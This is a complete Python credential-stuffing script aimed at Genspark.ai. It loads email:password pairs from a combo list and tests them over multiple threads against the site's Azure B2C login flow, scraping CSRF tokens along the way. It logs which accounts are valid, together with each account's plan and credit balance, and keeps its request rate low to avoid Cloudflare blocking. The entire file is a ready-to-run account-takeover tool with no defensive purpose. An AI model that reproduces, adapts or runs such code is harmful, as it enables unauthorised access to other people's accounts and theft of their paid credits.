import requests
import re
import json
import os
import threading
import time
from queue import Queue

# === CONFIGURATION ===
NUM_THREADS           = 10          # lower = less Cloudflare blocking
COMBO_FILE            = "combo.txt"
VALID_ACCOUNTS_FILE   = "comptes_valides.txt"
INVALID_ACCOUNTS_FILE = "comptes_invalides.txt"

# === COLORS ===
class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    RESET   = '\033[0m'

# === GLOBALS ===
file_lock      = threading.Lock()
combo_queue    = Queue()
checked_count  = 0
valid_count    = 0
total_accounts = 0

USER_URL    = "https://www.genspark.ai/api/user"
BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"

HEADERS = {
    'User-Agent'     : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9',
}


def get_plan_and_balance(sess):
    info = {'plan': 'N/A', 'interval': 'N/A', 'balance': 'N/A'}
    try:
        r = sess.get(USER_URL, timeout=12)
        if r.status_code == 200:
            body  = r.json()
            cogen = body.get("data", {}).get("cogen", {})
            plan     = cogen.get("personal_plan") or cogen.get("plan")
            interval = cogen.get("personal_paid_sub_interval")
            if plan:
                info['plan']     = plan
            if interval:
                info['interval'] = interval
    except Exception:
        pass
    try:
        r = sess.get(BALANCE_URL, timeout=12)
        if r.status_code == 200:
            balance = r.json().get("data", {}).get("balance")
            if balance is not None:
                info['balance'] = str(balance)
    except Exception:
        pass
    return info


def check_account(email, password):
    sess = requests.Session()
    sess.headers.update(HEADERS)

    try:
        # ── Step 1 : /api/login → Genspark generates PKCE+state, sets session_id ──
        # Retry up to 3 times in case of transient errors
        azure_url = ''
        for attempt in range(3):
            try:
                r_login = sess.get(
                    'https://www.genspark.ai/api/login?redirect_url=/',
                    timeout=15,
                    allow_redirects=False
                )
                loc = r_login.headers.get('location', '')
                if 'login.genspark.ai' in loc:
                    azure_url = loc
                    break
                # If we got a non-redirect (e.g. CF challenge), wait and retry
                time.sleep(1 + attempt)
            except Exception:
                time.sleep(1 + attempt)

        if not azure_url:
            return 'ERROR_NO_AZURE_URL', None

        # ── Step 2 : Load Azure B2C login page ───────────────────────────────────
        r1 = sess.get(azure_url, timeout=15)
        if r1.status_code != 200:
            return 'ERROR_AZURE_LOAD', None

        m = re.search(r'var SETTINGS = ({.*?});', r1.text, re.DOTALL)
        if not m:
            return 'ERROR_SETTINGS', None

        sdata          = json.loads(m.group(1))
        csrf_token     = sdata['csrf']
        transaction_id = sdata['transId']

        # ── Step 3 : POST credentials ─────────────────────────────────────────────
        r2 = sess.post(
            "https://login.genspark.ai/gensparkad.onmicrosoft.com/B2C_1_new_login/SelfAsserted",
            params={'tx': transaction_id, 'p': 'B2C_1_new_login'},
            headers={
                'x-csrf-token'    : csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Origin'          : 'https://login.genspark.ai',
                'Referer'         : r1.url,
            },
            data={'request_type': 'RESPONSE', 'email': email, 'password': password},
            timeout=15
        )
        if r2.status_code != 200:
            return 'ERROR_UNEXPECTED_RESPONSE', None

        r2_data = r2.json()
        if r2_data.get("status") == "400":
            msg = r2_data.get("message", "")
            msg_lower = msg.lower()
            if any(x in msg_lower for x in ["incorrect", "password is incorrect", "wrong"]):
                return 'WRONG_PASSWORD', None
            if any(x in msg_lower for x in ["find your account", "aadb2c90053"]):
                return 'ACCOUNT_NOT_FOUND', None
            if "aadb2c90053" in msg:
                return 'ACCOUNT_NOT_FOUND', None
            return 'ERROR_API', None

        if r2_data.get("status") != "200":
            return 'ERROR_API', None

        # ── Step 4 : confirmed → auth code redirect ───────────────────────────────
        confirm_url = (
            "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
            "B2C_1_new_login/api/CombinedSigninAndSignup/confirmed"
            "?rememberMe=false"
            f"&csrf_token={csrf_token}"
            f"&tx={transaction_id}"
            "&p=B2C_1_new_login"
        )
        hop1 = sess.get(confirm_url, timeout=15, allow_redirects=False)
        hop1_loc = hop1.headers.get('location', '')

        if 'error=' in hop1_loc:
            if 'AADB2C90053' in hop1_loc:
                return 'ACCOUNT_NOT_FOUND', None
            return 'INVALID', None

        if 'code=' not in hop1_loc:
            return 'ERROR_NO_CODE', None

        # ── Step 5 : /api/auth?code=&state= — Genspark does PKCE exchange ─────────
        hop2 = sess.get(hop1_loc, timeout=15, allow_redirects=False)
        hop2_loc = hop2.headers.get('location', '')

        # Success → redirect to "/" ; failure → redirect to /api/logout
        if '/api/logout' in hop2_loc or '/logout' in hop2_loc:
            return 'ERROR_NO_SESSION', None

        sess.headers.update({
            'Referer': 'https://www.genspark.ai/',
            'Origin' : 'https://www.genspark.ai',
        })

        # Quick sanity check
        try:
            rv = sess.get(USER_URL, timeout=12)
            if rv.status_code == 200 and rv.json().get("status") == -5:
                return 'ERROR_NO_SESSION', None
        except Exception:
            pass

        return 'SUCCESS', sess

    except (requests.exceptions.RequestException, json.JSONDecodeError, KeyError, TypeError):
        return 'ERROR_NETWORK', None


def worker():
    global checked_count, valid_count

    while not combo_queue.empty():
        try:
            line = combo_queue.get_nowait()
        except Exception:
            break

        line = line.strip()
        if not line or ':' not in line:
            combo_queue.task_done()
            continue

        email, password = line.split(':', 1)
        result_code, sess = check_account(email, password)

        with file_lock:
            checked_count += 1

            if result_code == 'SUCCESS':
                valid_count += 1
                info     = get_plan_and_balance(sess)
                plan     = info['plan']
                interval = info['interval']
                balance  = info['balance']

                save_line = f"{line} | Plan: {plan} | Interval: {interval} | Balance: {balance}"
                with open(VALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f:
                    f.write(save_line + "\n")

                if plan and plan.lower() == 'pro':
                    pc = Colors.MAGENTA
                elif plan and plan.lower() == 'plus':
                    pc = Colors.GREEN
                else:
                    pc = Colors.YELLOW

                plan_display = plan.upper() if plan != 'N/A' else 'FREE'
                message = (
                    f"{Colors.GREEN}Compte Valide{Colors.RESET} | "
                    f"Plan: {pc}{plan_display}{Colors.RESET} | "
                    f"Interval: {Colors.CYAN}{interval}{Colors.RESET} | "
                    f"Balance: {Colors.CYAN}{balance} credits{Colors.RESET}"
                )

            else:
                if result_code == 'WRONG_PASSWORD':
                    error_msg = "Mot de passe incorrect"
                elif result_code in ('ACCOUNT_NOT_FOUND', 'INVALID'):
                    error_msg = "Compte introuvable"
                else:
                    error_msg = f"Erreur ({result_code})"

                message = f"{Colors.RED}{error_msg}{Colors.RESET}"
                with open(INVALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f:
                    f.write(line + "\n")

            print(f"[{checked_count}/{total_accounts}] [Valides: {valid_count}] {line}  ->  {message}")

        combo_queue.task_done()


if __name__ == "__main__":
    if not os.path.exists(COMBO_FILE):
        print(f"{Colors.RED}ERREUR : '{COMBO_FILE}' introuvable.{Colors.RESET}")
        exit(1)

    open(VALID_ACCOUNTS_FILE,   'w').close()
    open(INVALID_ACCOUNTS_FILE, 'w').close()

    with open(COMBO_FILE, 'r', encoding='utf-8') as f:
        lines = [l.strip() for l in f if ':' in l.strip()]
    for l in lines:
        combo_queue.put(l)

    total_accounts = len(lines)
    if total_accounts == 0:
        print(f"{Colors.YELLOW}'{COMBO_FILE}' est vide ou mal formate.{Colors.RESET}")
        exit(1)

    print(f"--- Verification de {total_accounts} comptes ({NUM_THREADS} threads) ---")

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    combo_queue.join()

    print(f"\n--- Termine ---")
    inv = total_accounts - valid_count
    print(f"Resultats : {valid_count} valides, {inv} invalides sur {total_accounts} comptes.")
    print(f"{Colors.GREEN}Valides   -> '{VALID_ACCOUNTS_FILE}'{Colors.RESET}")
    print(f"{Colors.RED}Invalides -> '{INVALID_ACCOUNTS_FILE}'{Colors.RESET}")
